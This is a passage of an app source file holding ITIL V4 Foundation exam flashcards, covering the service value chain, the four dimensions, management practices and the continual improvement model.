                  'Demand: Business requests a new mobile app for field engineers. Value stream: Plan (architecture, budget) → Engage (capture requirements from engineers) → Design & Transition (design app, plan release) → Obtain/Build (develop app, procure MDM tool) → Deliver & Support (deploy app, support users) → Improve (monitor adoption, iterate features).',
              'example':
                  'Notice that Improve is present even after deployment — not just at the end. Notice that Plan informed the whole stream from the start. This is how V4 SVC differs from v3 lifecycle: all activities are continuously available, not locked in sequence.',
            },
            {
              'label': 'Scenario',
              'term': 'SVC Walkthrough — Incident Response',
              'definition':
                  'Demand: User reports email not working. Value stream: Engage (user contacts service desk) → Deliver & Support (incident logged, triaged, resolved) → Improve (incident data fed back for problem identification). Plan and Obtain/Build are not needed for a standard incident — value streams are minimal when appropriate.',
              'example':
                  'Exam trap: Not every SVC activity appears in every value stream. For routine incidents, only Engage, Deliver & Support, and Improve are typically used. Using all six activities for every request would violate "Keep It Simple and Practical."',
            },
            {
              'label': 'Exam prep',
              'term': 'Module 3 — SVC Exam Traps',
              'definition':
                  '1) SVC has SIX activities — not five, not seven. 2) There is NO fixed order — it is flexible. 3) Design & Transition is ONE activity in V4. 4) Improve runs throughout — not only at the end. 5) Value streams are combinations of SVC activities — not the activities themselves. 6) "Plan" feeds ALL other activities.',
              'example':
                  'The most common exam question type for the SVC is: "An organisation is doing X — which SVC activity is primarily responsible?" Map the scenario to the correct activity using the definitions on this card.',
            },
            {
              'label': 'Application',
              'term': 'How the SVC Supports Agile and DevOps',
              'definition':
                  'The SVC\'s non-linear, flexible structure directly mirrors how Agile sprints and DevOps pipelines work. Design & Transition can occur in short iterations. Obtain/Build aligns with sprint delivery. Deliver & Support aligns with continuous deployment. ITIL V4\'s SVC was redesigned specifically to stop conflicting with Agile and DevOps workflows.',
              'example':
                  'A DevOps team runs two-week sprints. Each sprint maps to: Engage (backlog grooming with stakeholders), Design & Transition (sprint planning and design), Obtain/Build (sprint development), Deliver & Support (deployment and monitoring). No conflict — SVC and DevOps are aligned.',
            },
            {
              'label': 'Foundation',
              'term': 'Information Flows in the SVC',
              'definition':
                  'Each SVC activity both produces and consumes information. For example: Plan produces policies (consumed by all activities). Engage produces requirements (consumed by Design & Transition). Deliver & Support produces performance data (consumed by Improve). Understanding these flows is essential for value stream design.',
              'example':
                  'Exam scenario: "The service desk is resolving incidents but improvement trends are not being identified." This means performance data from Deliver & Support is NOT flowing into Improve. The information flow between these two SVC activities is broken.',
            },
          ];

        // ── Module 04: The Four Dimensions of Service Management ───────────
        case 'module-04':
          return [
            {
              'label': 'Four Dimensions',
              'term': 'What Are the Four Dimensions?',
              'definition':
                  'ITIL V4 defines four dimensions that must be considered for every service and every SVS component: 1) Organisations & People, 2) Information & Technology, 3) Partners & Suppliers, 4) Value Streams & Processes. Each dimension is essential — neglecting any one leads to service failure.',
              'example':
                  'Exam trap: There are EXACTLY four dimensions. They apply to ALL services and ALL components of the SVS — not just new services. Memorise the four names and their order. Any exam option with five dimensions or a different name is wrong.',
            },
            {
              'label': 'Dimension 1',
              'term': 'Organisations & People',
              'definition':
                  'This dimension covers the structure, roles, responsibilities, culture, and capabilities of people involved in service management. It includes: organisational structures, staffing, skills, communication, and culture. Without the right people and culture, even perfect processes will fail.',
              'example':
                  'Scenario: A company implements ITIL but the service desk staff have no training and the management culture discourages reporting incidents. The Organisations & People dimension is the failure point — the process exists but people cannot or will not execute it.',
            },
            {
              'label': 'Dimension 1',
              'term': 'Organisational Culture in ITIL V4',
              'definition':
                  'Culture — the shared values, norms, and behaviours of an organisation — is explicitly part of the Organisations & People dimension. ITIL V4 recognises that culture can either enable or block effective service management. A blame culture, for example, will suppress incident reporting and prevent learning.',
              'example':
                  'Exam trap: Culture is NOT a soft add-on in ITIL V4 — it is a formal component of a defined dimension. If a question asks which dimension covers leadership style, management philosophy, or employee behaviour, the answer is Organisations & People.',
            },
            {
              'label': 'Dimension 2',
              'term': 'Information & Technology',
              'definition':
                  'This dimension covers the information and knowledge managed by services, and the technologies used to do so. It includes: information architecture, data management, tools, platforms, AI, automation, and knowledge management. Both the information itself AND the technology that stores/processes it are in scope.',
              'example':
                  'Scenario: A service desk uses a CMDB (Configuration Management Database) to track assets and an ITSM platform to manage tickets. Both the data (configuration records) and the tool (ITSM platform) fall under the Information & Technology dimension.',
            },
            {
              'label': 'Dimension 2',
              'term': 'Technology Considerations in ITIL V4',
              'definition':
                  'ITIL V4 highlights several technology considerations relevant to service management: AI and machine learning for automation, cloud platforms for flexibility, mobile solutions for accessibility, and integration between tools. The choice of technology must support — not constrain — the service management approach.',
              'example':
                  'Exam trap: Technology choices must align with the organisation\'s overall service strategy — not the other way around. If a scenario shows an organisation changing its processes to fit a tool they purchased, the Information & Technology dimension is being mismanaged.',
            },
            {
              'label': 'Dimension 3',
              'term': 'Partners & Suppliers',
              'definition':
                  'This dimension covers the organisation\'s relationships with other organisations involved in the design, development, deployment, delivery, support, and continual improvement of services. It includes outsourced providers, cloud vendors, contractors, and technology suppliers.',
              'example':
                  'Scenario: A company uses AWS for hosting, a third-party NOC for monitoring, and a software vendor for its ITSM tool. All three are Partners & Suppliers. Their contracts, SLAs, and performance directly affect the quality of services delivered to end customers.',
            },
            {
              'label': 'Dimension 3',
              'term': 'Service Integration and Management (SIAM)',
              'definition':
                  'SIAM is an approach to managing multiple suppliers delivering services to a single customer. It is directly associated with the Partners & Suppliers dimension. SIAM coordinates between suppliers, manages interfaces and contracts, and ensures end-to-end service quality when no single supplier owns the full value chain.',
              'example':
                  'Exam trap: SIAM is explicitly linked to the Partners & Suppliers dimension. If an exam question describes an organisation with multiple IT suppliers and asks which dimension is most relevant, the answer is Partners & Suppliers, and the management approach is SIAM.',
            },
            {
              'label': 'Dimension 4',
              'term': 'Value Streams & Processes',
              'definition':
                  'This dimension covers how the organisation\'s activities are organised to create value. It includes value streams (end-to-end sequences of activities) and processes (sets of interrelated activities that transform inputs into outputs). It defines HOW work gets done — the "workflow" of service management.',
              'example':
                  'Scenario: The incident management process defines steps for logging, categorising, investigating, and resolving incidents. This process is part of the Value Streams & Processes dimension. The value stream shows how this process contributes to service restoration from the customer\'s perspective.',
            },
            {
              'label': 'Dimension 4',
              'term': 'Processes vs Value Streams',
              'definition':
                  'A process is a specific set of activities with defined inputs, outputs, triggers, and outcomes — focused internally on how work is done. A value stream is an end-to-end view of how activities combine to deliver value to the customer — focused externally on what the customer receives. Value streams contain processes.',
              'example':
                  'Exam trap: Processes and value streams are both in the same dimension (Value Streams & Processes) but are different concepts. Processes are internal; value streams are customer-facing. A single value stream may include multiple processes from multiple practices.',
            },
            {
              'label': 'External factors',
              'term': 'PESTLE Factors and the Four Dimensions',
              'definition':
                  'All four dimensions are subject to external constraints captured by the PESTLE framework: Political, Economic, Social, Technological, Legal, and Environmental factors. These external forces can influence any dimension — for example, new data protection laws (Legal/PESTLE) affect the Information & Technology dimension.',
              'example':
                  'GDPR (Legal) forces changes to the Information & Technology dimension — data must be encrypted, access-controlled, and auditable. A new regulation about supplier audits (Legal) affects the Partners & Suppliers dimension. PESTLE is the "outside world" wrapper around the four dimensions.',
            },
            {
              'label': 'Application',
              'term': 'Applying All Four Dimensions — Scenario',
              'definition':
                  'When designing or improving any service, all four dimensions must be considered: 1) Who will run it and do they have the skills? (Org & People) 2) What data and tools are required? (Info & Tech) 3) Which suppliers are involved? (Partners & Suppliers) 4) How will the work flow end-to-end? (Value Streams & Processes).',
              'example':
                  'New service: automated patch management. Org & People: who approves patches, who is on-call? Info & Tech: what patch management tool, what CMDB integration? Partners & Suppliers: does the OS vendor provide patch feeds? Value Streams & Processes: what is the end-to-end flow from patch release to deployment to verification?',
            },
            {
              'label': 'Misconception',
              'term': 'Common Misconception: Dimensions Are Separate Concerns',
              'definition':
                  'The four dimensions are interdependent — a decision in one dimension always affects the others. For example, choosing a new technology tool (Info & Tech) may require new skills (Org & People), new supplier contracts (Partners & Suppliers), and revised workflows (Value Streams & Processes). No dimension is isolated.',
              'example':
                  'Exam trap: If a question describes an improvement that only addresses one dimension while ignoring others, ITIL V4 would flag this as incomplete. The correct approach always considers all four dimensions holistically — this connects to the "Think and Work Holistically" guiding principle.',
            },
            {
              'label': 'Exam prep',
              'term': 'Module 4 — Four Dimensions Exam Traps',
              'definition':
                  '1) There are FOUR dimensions — know all four names exactly. 2) Culture belongs to Organisations & People — not a separate dimension. 3) SIAM belongs to Partners & Suppliers. 4) PESTLE is an EXTERNAL factor affecting all four dimensions — it is NOT a fifth dimension. 5) Value Streams & Processes contains BOTH value streams AND processes — not just processes.',
              'example':
                  'Quick test: Which dimension covers the CMDB? (Info & Tech). Which covers an outsourced NOC? (Partners & Suppliers). Which covers the incident management workflow? (Value Streams & Processes). Which covers the service desk team\'s skills? (Org & People).',
            },
            {
              'label': 'Acronym drill',
              'term': 'Four Dimensions Mnemonics',
              'definition':
                  'Memory aid: "I OWN a Valuable Place" — Information & Technology, Organisations & People, (partners &) suppliers With contracts, (value streams and) processes for Value. Or simply: O-I-P-V (Organisations, Information, Partners, Value Streams). Any mnemonic that helps you recall all four without missing one is valid.',
              'example':
                  'Exam format: Questions often describe a scenario and ask "which dimension is MOST relevant?" Match the scenario to the dimension: people/culture = O&P; tools/data = I&T; third parties/vendors = P&S; workflows/processes = VS&P.',
            },
            {
              'label': 'Foundation',
              'term': 'Why Four Dimensions? The Holistic View',
              'definition':
                  'ITIL V4 introduced the four dimensions to replace the concept of "people, process, and technology" (a three-factor model from earlier frameworks). By separating "Partners & Suppliers" as its own dimension and explicitly adding "Value Streams," ITIL V4 reflects the reality of modern IT — where outsourcing and end-to-end thinking are essential.',
              'example':
                  'The old model (people, process, technology) missed supplier management and end-to-end value flow. V4 corrected this by making both explicit dimensions. If an exam option says "three dimensions" or uses the old PPT framework, it is describing pre-V4 thinking.',
            },
          ];

        // ── Module 05: ITIL V4 Management Practices (Part 1) ───────────────
        case 'module-05':
          return [
            {
              'label': 'Practices Overview',
              'term': 'What Are ITIL V4 Practices?',
              'definition':
                  'A practice is a set of organisational resources designed for performing work or accomplishing an objective. ITIL V4 defines 34 practices across three categories: General Management Practices (14), Service Management Practices (17), and Technical Management Practices (3). Practices replace the "processes" of ITIL v3.',
              'example':
                  'Exam trap: ITIL V4 has 34 practices, not 26. The ITIL V4 Foundation exam tests 18 of the 34 in detail — but you must know how many total practices exist and the three categories. Do not confuse "practices" with "processes" — V4 uses practices.',
            },
            {
              'label': 'Practice',
              'term': 'Incident Management',
              'definition':
                  'Incident Management minimises the negative impact of incidents by restoring normal service operation as quickly as possible. An incident is an unplanned interruption or reduction in quality of an IT service. The goal is speed of restoration — not necessarily identifying root cause (that is Problem Management).',
              'example':
                  'Exam trap: Incident Management does NOT find root cause — it restores service. Root cause analysis is Problem Management. A question describing "investigating why a server crashed repeatedly" is Problem Management. "Getting the server back online" is Incident Management.',
            },
            {
              'label': 'Practice',
              'term': 'Incident Categorisation and Prioritisation',
              'definition':
                  'Incidents are categorised by type (hardware, software, network, etc.) and prioritised by Impact (breadth of effect on business) × Urgency (speed at which the business needs resolution). Priority = Impact × Urgency. High impact + high urgency = Priority 1.',
              'example':
                  'Scenario: Email is down for all 500 staff (high impact) during year-end close (high urgency) = Priority 1. One user cannot access a non-critical report (low impact, low urgency) = Priority 4. Knowing how to calculate priority from a scenario is a guaranteed exam question type.',
            },
            {
              'label': 'Practice',
              'term': 'Problem Management',
              'definition':
                  'Problem Management reduces the likelihood and impact of incidents by identifying root causes and managing known errors. Three phases: Problem Identification (find the problem), Problem Control (analyse and document workarounds), Error Control (manage known errors until permanent fix). A Problem is the cause of incidents; a Known Error is a problem with a documented workaround.',
              'example':
                  'Exam trap: A "Known Error" is NOT the same as a Problem. A Known Error has a diagnosed root cause and a documented workaround. A Problem may not yet have a known root cause. The KEDB (Known Error Database) stores Known Errors. This distinction is tested on the exam.',
            },
            {
              'label': 'Practice',
              'term': 'Change Enablement',
              'definition':
                  'Change Enablement maximises successful service and product changes by ensuring risks are assessed, changes are authorised, and the schedule is managed. Change types: Standard (pre-authorised, low risk), Normal (requires CAB or change authority approval), Emergency (expedited approval for urgent changes). A change is the addition, modification, or removal of anything that could affect services.',
              'example':
                  'Exam trap: The practice is called "Change Enablement" in V4 — NOT "Change Management" (the v3 name). The Change Advisory Board (CAB) still exists in V4 but is one possible change authority — not mandatory for all changes. Standard changes bypass the CAB entirely.',
            },
            {
              'label': 'Practice',
              'term': 'Change Types — Standard, Normal, Emergency',
              'definition':
                  'Standard Change: pre-authorised, low-risk, well-understood, routine (e.g. password reset). Does not require individual approval. Normal Change: requires assessment, approval via change authority, scheduled. Emergency Change: implemented urgently to resolve a critical incident or threat. Has expedited but still documented approval.',
              'example':
                  'Scenario: A network engineer needs to reboot a switch during a maintenance window (Standard). A team wants to deploy a new application (Normal). A zero-day exploit requires an emergency patch tonight (Emergency). Identifying the change type from a scenario description is a core exam skill.',
            },
            {
              'label': 'Practice',
              'term': 'Service Request Management',
              'definition':
                  'Service Request Management supports the agreed quality of a service by handling all pre-defined, user-initiated service requests. A service request is a formal request for something the user is entitled to — e.g. a new laptop, password reset, or software installation. It is NOT an incident (no failure) and NOT a change (no risk assessment required).',
              'example':
                  'Exam trap: Service requests are SEPARATE from incidents and changes. A user requesting a new monitor is a service request. A user reporting their monitor has stopped working is an incident. Confusing these two is the most common mistake on this topic.',
            },
            {
              'label': 'Practice',
              'term': 'Service Desk Practice',
              'definition':
                  'The Service Desk is the single point of contact (SPOC) between the service provider and its users. It handles incidents, service requests, and communication. Service desk types: Local (on-site), Centralised (one location for all users), Virtual (distributed but unified by technology), Follow-the-Sun (24/7 across time zones).',
              'example':
                  'Exam trap: The Service Desk is a PRACTICE in V4, not just a team or a function. It is about the capability to handle interactions — enabled by people, tools, and processes. The "follow-the-sun" model (different time zones handle requests continuously) is a specific type worth knowing.',
            },
            {
              'label': 'Practice',
              'term': 'Service Level Management',
              'definition':
                  'Service Level Management sets clear business-based targets for service levels and ensures services are delivered to these targets. Key documents: SLA (Service Level Agreement — with customer), OLA (Operational Level Agreement — internal agreement), UC (Underpinning Contract — with external supplier). All three must align upwards to support the SLA.',
              'example':
                  'Scenario: The SLA promises 99.9% uptime. The OLA commits the infrastructure team to 99.95% uptime for their systems. The UC commits the data centre supplier to 99.99%. This hierarchy (UC → OLA → SLA) ensures the SLA target is achievable.',
            },
            {
              'label': 'Practice',
              'term': 'SLA, OLA, and UC — Hierarchy and Alignment',
              'definition':
                  'The SLA is the external-facing agreement with the customer. The OLA is the internal agreement between IT teams supporting the service. The UC is the contract with a third-party supplier. OLAs and UCs must collectively support SLA commitments — their targets should be stronger (higher availability, faster response) than the SLA requires.',
              'example':
                  'Exam trap: The OLA is INTERNAL — between teams within the same organisation. The UC is EXTERNAL — with an outside vendor. If an exam describes an agreement with a third-party cloud provider, it is a UC, not an OLA. If it is between the service desk and the infrastructure team, it is an OLA.',
            },
            {
              'label': 'Practice',
              'term': 'Monitoring and Event Management',
              'definition':
                  'Monitoring and Event Management observes services and service components systematically and records and reports selected changes of state (events). Event types: Informational (normal operation), Warning (threshold approaching), Exception (failure or threshold breached). Exceptions typically trigger Incident Management.',
              'example':
                  'Scenario: A monitoring tool detects CPU usage at 95% (Warning event) and sends an alert. IT staff investigate and add capacity before a failure occurs. If ignored and CPU hits 100%, the server crashes — an Exception event triggers an Incident. Effective monitoring prevents incidents.',
            },
            {
              'label': 'Practice',
              'term': 'IT Asset Management',
              'definition':
                  'IT Asset Management plans and manages the full lifecycle of all IT assets to help the organisation maximise value, control costs, manage risks, support decision-making, and meet regulatory requirements. An IT asset is any financially valuable component that contributes to delivering IT products or services.',
              'example':
                  'Exam trap: IT Asset Management covers the FULL LIFECYCLE — procurement, deployment, operation, maintenance, and disposal. It is not just an inventory list. If a question involves software licence compliance, hardware disposal, or lifecycle cost tracking, IT Asset Management is the relevant practice.',
            },
            {
              'label': 'Practice',
              'term': 'Configuration Management and the CMDB',
              'definition':
                  'The Service Configuration Management practice ensures that accurate information about configuration items (CIs) and their relationships is available when and where needed. The Configuration Management Database (CMDB) stores CI records. CIs include: hardware, software, services, documentation, and people.',
              'example':
                  'Scenario: An incident is raised about a failing application. The service desk queries the CMDB to see which servers the application runs on, which services depend on it, and which recent changes were made to its CIs. The CMDB enables faster, more accurate incident resolution.',
            },
            {
              'label': 'Exam prep',
              'term': 'Module 5 — Top Practice Exam Traps',
              'definition':
                  '1) Incident = restore service; Problem = find root cause. 2) Change Enablement (not "Change Management"). 3) Standard changes bypass CAB. 4) Service requests are NOT incidents. 5) OLA = internal; UC = external supplier. 6) Known Error has a documented workaround — Problem may not. 7) Service Desk is a practice, not just a team.',
              'example':
                  'Most ITIL V4 Foundation exam questions on practices are scenario-based. Practice mapping scenarios to practices: "user can\'t log in" = Incident. "why do users keep getting locked out?" = Problem. "user wants a new keyboard" = Service Request. "rolling out new firewall rules" = Change Enablement.',
            },
            {
              'label': 'Acronym drill',
              'term': 'Key Practice Acronyms',
              'definition':
                  'KEDB = Known Error Database (Problem Management). CMDB = Configuration Management Database. CAB = Change Advisory Board (Change Enablement). SPOC = Single Point of Contact (Service Desk). SLA = Service Level Agreement. OLA = Operational Level Agreement. UC = Underpinning Contract. CI = Configuration Item.',
              'example':
                  'These acronyms appear in exam questions and answer options. If you see "KEDB" in an answer, the question is about Problem Management. If you see "CAB," it is about Change Enablement. Acronym recognition speeds up answer elimination.',
            },
            {
              'label': 'Scenario',
              'term': 'Incident vs Problem — Scenario Practice',
              'definition':
                  'Use these rules: If the question asks about RESTORING SERVICE → Incident Management. If it asks about PREVENTING RECURRENCE or FINDING ROOT CAUSE → Problem Management. If it mentions KNOWN ERROR or WORKAROUND → Problem Management / Error Control. If it says "reactive" to a specific failure → Incident. If it says "proactive" analysis → Problem.',
              'example':
                  'Scenario A: "Users cannot access the VPN. The team is working to restore connectivity." → Incident Management. Scenario B: "The VPN has gone down four times this month. The team is investigating the underlying cause." → Problem Management. Scenario C: "A workaround exists — users connect via web portal while the VPN is fixed." → Known Error / Error Control.',
            },
          ];

        // ── Module 06: ITIL V4 Management Practices (Part 2) ───────────────
        case 'module-06':
          return [
            {
              'label': 'Practice',
              'term': 'Release Management',
              'definition':
                  'Release Management makes new and changed services and features available for use. A release is a version of a service or other configuration item made available for use. Release Management plans, schedules, controls, and deploys releases while ensuring integrity of the live environment.',
              'example':
                  'Exam trap: Release Management is about making a change AVAILABLE — it does NOT handle the change approval (that is Change Enablement). In a DevOps context, Release Management may be automated via a CI/CD pipeline. The practice manages WHAT is released and WHEN.',
            },
            {
              'label': 'Practice',
              'term': 'Deployment Management',
              'definition':
                  'Deployment Management moves new or changed hardware, software, documentation, processes, or any other component to live environments. It may also deploy to testing or staging environments. Deployment Management is the TECHNICAL execution of moving components — separate from Release Management which controls the "what and when."',
              'example':
                  'Exam trap: Release Management ≠ Deployment Management. Release Management decides what gets released and when. Deployment Management physically moves the components into place. Both practices work together but are distinct. Questions about "putting code onto production servers" = Deployment Management.',
            },
            {
              'label': 'Practice',
              'term': 'Continual Improvement Practice',
              'definition':
                  'The Continual Improvement practice aligns the organisation\'s practices and services with changing business needs through the ongoing identification and improvement of services, service components, practices, and the SVS. It uses the seven-step Continual Improvement Model as its core tool.',
              'example':
                  'Exam trap: Continual Improvement is BOTH a component of the SVS AND a standalone practice. The SVS component sets the culture and intent; the practice provides the structured process and tools (the model) to execute improvement. Do not confuse the two — they exist at different levels.',
            },
            {
              'label': 'Practice',
              'term': 'The Seven-Step Continual Improvement Model',
              'definition':
                  'The model has seven steps: 1) What is the vision? 2) Where are we now? 3) Where do we want to be? 4) How do we get there? 5) Take action. 6) Did we get there? 7) How do we keep the momentum going? Steps 2 and 6 require measurement — current state assessment and results evaluation.',
              'example':
                  'Exam trap: The model has SEVEN steps. Step 1 (vision) and Step 7 (momentum) are often missed by candidates. The model is iterative — after Step 7, you return to Step 1 for the next improvement cycle. It never truly ends.',
            },
            {
              'label': 'Practice',
              'term': 'Knowledge Management',
              'definition':
                  'Knowledge Management maintains and improves the effective, efficient, and convenient use of information and knowledge across the organisation. It uses the DIKW model: Data → Information → Knowledge → Wisdom. The goal is ensuring the right people have the right knowledge at the right time.',
              'example':
                  'Scenario: A service desk analyst uses a knowledge base article to resolve an incident in 3 minutes instead of 45. The article was created from a Previous incident (data → information → knowledge). Knowledge Management created and maintained that article, accelerating resolution and reducing escalations.',
            },
            {
              'label': 'Practice',
              'term': 'DIKW Model — Data, Information, Knowledge, Wisdom',
              'definition':
                  'Data: raw facts with no context. Information: data with context (who, what, where, when). Knowledge: information combined with experience and judgement (how). Wisdom: applying knowledge to make sound decisions (why). ITIL V4 Knowledge Management aims to move organisations up the DIKW pyramid.',
              'example':
                  'Exam trap: Know the correct sequence D → I → K → W and what each level means. A raw server log is Data. A report showing "Server X crashed 5 times on Tuesdays" is Information. "Server X crashes because of a scheduled backup conflict" is Knowledge. "Schedule backups to avoid peak hours to prevent recurrence" is Wisdom.',
            },
            {
              'label': 'Practice',
              'term': 'Relationship Management',
              'definition':
                  'Relationship Management establishes and nurtures links between the organisation and its stakeholders at strategic and tactical levels. It identifies and analyses stakeholder needs and ensures the organisation understands and responds to those needs. It covers both internal and external relationships.',
              'example':
                  'Exam trap: Relationship Management is NOT the same as Service Level Management. Relationship Management is about TRUST, COMMUNICATION, and ENGAGEMENT with stakeholders. SLM is about TARGETS and AGREEMENTS. Both are needed, but for different reasons.',
            },
            {
              'label': 'Practice',
              'term': 'Supplier Management',
              'definition':
                  'Supplier Management ensures the organisation\'s suppliers and their performances are managed appropriately to support the seamless provision of quality products and services. It manages supplier contracts, performance, relationships, and risk. Closely linked to the Partners & Suppliers dimension.',
              'example':
                  'Scenario: A cloud provider misses its uptime SLA. Supplier Management initiates a formal performance review, applies contract penalties, and evaluates whether to continue or switch suppliers. Without Supplier Management, poor supplier performance would go unaddressed.',
            },
            {
              'label': 'Practice',
              'term': 'Service Catalogue Management',
              'definition':
                  'Service Catalogue Management provides a single source of consistent information on all services and service offerings. The service catalogue is the portion of the service portfolio visible to customers — it lists available services, their descriptions, and how to request them.',
              'example':
                  'Exam trap: The Service Catalogue is part of the Service Portfolio. The portfolio contains ALL services (pipeline, catalogue, and retired). The catalogue contains only LIVE services available to customers. Questions about "what services can customers request?" = Service Catalogue.',
            },
            {
              'label': 'Practice',
              'term': 'Service Design Practice',
              'definition':
                  'Service Design ensures products and services are designed to meet customer expectations for quality, cost, and time-to-market. It addresses all four dimensions (O&P, I&T, P&S, VS&P) and produces service designs, plans, and architectures as inputs to the Design & Transition SVC activity.',
              'example':
                  'Scenario: A new HR system is being commissioned. Service Design produces: the technical architecture, the support model, the training plan for staff, the monitoring approach, and the SLA targets. All of this feeds into Design & Transition in the SVC.',
            },
            {
              'label': 'Practice',
              'term': 'Business Analysis Practice',
              'definition':
                  'Business Analysis identifies business needs and recommends solutions that deliver value to stakeholders. In ITIL V4 context, it bridges the gap between business requirements and IT services — ensuring the right services are built to meet the right needs. It supports the Engage and Plan SVC activities heavily.',
              'example':
                  'Scenario: Business stakeholders say they "need a better system." Business Analysis converts this vague need into documented requirements: specific workflows, data needs, user personas, and acceptance criteria. Without Business Analysis, IT teams build what they THINK is needed, not what is actually needed.',
            },
            {
              'label': 'Practice',
              'term': 'Risk Management Practice',
              'definition':
                  'Risk Management ensures that the organisation understands and effectively handles risks. In ITIL V4, risk is defined as a possible event that could cause harm, loss, or make it more difficult to achieve objectives. Risk management involves: risk identification, risk assessment (likelihood × impact), risk treatment (avoid, reduce, transfer, accept).',
              'example':
                  'Exam trap: Risk treatment has FOUR options — avoid, reduce, transfer, accept. "Transfer" means passing the risk to a third party (e.g. insurance or outsourcing). Exam questions may ask which treatment applies in a given scenario — know all four and when each is appropriate.',
            },
            {
              'label': 'Practice',
              'term': 'Workforce and Talent Management',
              'definition':
                  'Workforce and Talent Management ensures the organisation has the right people with the right skills in the right roles. It covers recruitment, training, performance management, and succession planning. It is part of the General Management Practices category and directly supports the Organisations & People dimension.',
              'example':
                  'Scenario: The service desk has high staff turnover and knowledge gaps. Workforce and Talent Management addresses this through improved onboarding, career development paths, and targeted training. Ignoring this practice causes service quality to degrade as experienced staff leave.',
            },
            {
              'label': 'Exam prep',
              'term': 'Module 6 — Practice Exam Traps (Part 2)',
              'definition':
                  '1) Release Management = WHAT/WHEN to release. Deployment Management = HOW to move it. 2) CI model has SEVEN steps. 3) DIKW = Data → Information → Knowledge → Wisdom (in order). 4) Service Catalogue = live services only. Service Portfolio = all services. 5) Continual Improvement is both an SVS component AND a practice.',
              'example':
                  'Scenario practice: "The team is deciding which improvements to tackle next quarter" = Continual Improvement. "New version of the app is ready — planning the go-live window" = Release Management. "Running the deployment script on production servers" = Deployment Management. "Logging resolved incident solutions in the knowledge base" = Knowledge Management.',
            },
            {
              'label': 'Acronym drill',
              'term': 'Practice Category Breakdown',
              'definition':
                  'General Management Practices (14): Strategy Mgmt, Portfolio Mgmt, Architecture Mgmt, Service Financial Mgmt, Workforce & Talent Mgmt, Continual Improvement, Measurement & Reporting, Risk Mgmt, Information Security Mgmt, Knowledge Mgmt, Org Change Mgmt, Project Mgmt, Relationship Mgmt, Supplier Mgmt. Service Management Practices (17) and Technical Management Practices (3) make up the remaining 20.',
              'example':
                  'Exam trap: Know that there are 14 General, 17 Service Management, and 3 Technical Management practices. The three Technical Management practices are: Deployment Management, Infrastructure & Platform Management, and Software Development & Management. These are the least-tested but can appear as distractors.',
            },
          ];

        // ── Module 07: Continual Improvement & Measurement ─────────────────
        case 'module-07':
          return [
            {
              'label': 'Continual Improvement',
              'term': 'Continual Improvement vs Continual Service Improvement',
              'definition':
                  'ITIL v3 used the term "Continual Service Improvement (CSI)" as one of five lifecycle stages. ITIL V4 replaces this with "Continual Improvement" — a broader concept that applies to all SVS components: practices, the value chain, governance, and the guiding principles — not just services.',
              'example':
                  'Exam trap: "Continual Service Improvement" is an ITIL v3 term. Using it in an ITIL V4 exam answer is risky. The correct V4 term is "Continual Improvement." If an exam option says "Continual Service Improvement" in a V4 context, read carefully — it may be the wrong answer.',
            },
            {
              'label': 'CI Model',
              'term': 'Step 1 — What is the Vision?',
              'definition':
                  'The first step of the Continual Improvement Model establishes the high-level direction of the improvement initiative by understanding the organisation\'s strategic goals and objectives. All improvement work must ultimately link back to this vision to ensure alignment. Without a clear vision, improvement efforts fragment and lose business support.',
              'example':
                  'Scenario: The organisation\'s vision is "become the most reliable financial services provider in the region." An improvement initiative to reduce service desk resolution times supports this vision. One that adds cosmetic features to an internal tool does not — and should be deprioritised.',
            },
            {
              'label': 'CI Model',
              'term': 'Step 2 — Where Are We Now? (Baseline Assessment)',
              'definition':
                  'Step 2 performs an objective assessment of the current state — using data, metrics, and observations rather than assumptions. This baseline is critical: without knowing the current state accurately, you cannot measure improvement. Subjective or anecdotal assessments violate the "Start Where You Are" guiding principle.',
              'example':
                  'Exam trap: The baseline must be OBJECTIVE and DATA-BASED — not based on perception or gut feeling. If an exam scenario describes an improvement where no current state measurement was taken, this is a failure of Step 2, and improvement results cannot be verified.',
            },
            {
              'label': 'CI Model',
              'term': 'Step 3 — Where Do We Want to Be? (Target State)',
              'definition':
                  'Step 3 defines measurable improvement targets — the desired future state. Targets should be SMART: Specific, Measurable, Achievable, Relevant, Time-bound. Vague targets like "improve customer satisfaction" are insufficient — "increase CSAT score from 72% to 85% by Q3" is a Step 3 target.',
              'example':
                  'Scenario: Current state (Step 2) = mean time to resolve (MTTR) incidents is 4 hours. Target (Step 3) = reduce MTTR to 2 hours within 6 months. This creates a measurable gap that drives the improvement plan in Steps 4 and 5.',
            },
            {
              'label': 'CI Model',
              'term': 'Step 4 — How Do We Get There? (Improvement Plan)',
              'definition':
                  'Step 4 designs the improvement plan — the specific actions, resources, timelines, and owners needed to close the gap between current state (Step 2) and target state (Step 3). Multiple approaches should be evaluated and the most practical, cost-effective option selected.',
              'example':
                  'Scenario: To reduce MTTR from 4h to 2h: hire two additional level-2 engineers, implement an automated triage tool, and create 50 knowledge base articles for common issues. Each action has an owner, a deadline, and a budget — this is the Step 4 plan.',
            },
            {
              'label': 'CI Model',
              'term': 'Step 5 — Take Action',
              'definition':
                  'Step 5 executes the improvement plan, using an iterative approach — making incremental changes and checking results at each stage rather than a single large-scale deployment. This aligns with the "Progress Iteratively with Feedback" guiding principle.',
              'example':
                  'Exam trap: Step 5 does NOT mean "implement everything at once." The ITIL V4 preference is iterative implementation — pilot a change, measure, adjust, then scale. Big-bang implementations that skip feedback loops violate the V4 principles and increase risk.',
            },
            {
              'label': 'CI Model',
              'term': 'Step 6 — Did We Get There? (Evaluate Results)',
              'definition':
                  'Step 6 measures and evaluates the results of the improvement actions against the target set in Step 3. Key question: did we achieve the defined target? If yes, document the success and communicate it. If no, identify what fell short and feed findings back into the model.',
              'example':
                  'Scenario: After six months, MTTR is now 2.5 hours — improved from 4h but not yet at the 2h target. Step 6 shows partial success. The findings loop back — a new Step 3 target (2h) and a revised plan (Step 4) are set. Improvement continues.',
            },
            {
              'label': 'CI Model',
              'term': 'Step 7 — How Do We Keep the Momentum Going?',
              'definition':
                  'Step 7 embeds the improvement in normal operations and maintains the motivation to continue improving. It involves communicating wins, recognising contributors, and identifying the NEXT improvement opportunity — returning to Step 1 for the next cycle. Continual improvement is circular, not linear.',
              'example':
                  'Exam trap: Many candidates think the model ends at Step 6. Step 7 explicitly exists to prevent "improvement fatigue" — where wins are celebrated briefly and then momentum is lost. If a question describes an organisation that improves, celebrates, then stagnates, Step 7 is the missing element.',
            },
            {
              'label': 'Measurement',
              'term': 'CSFs and KPIs',
              'definition':
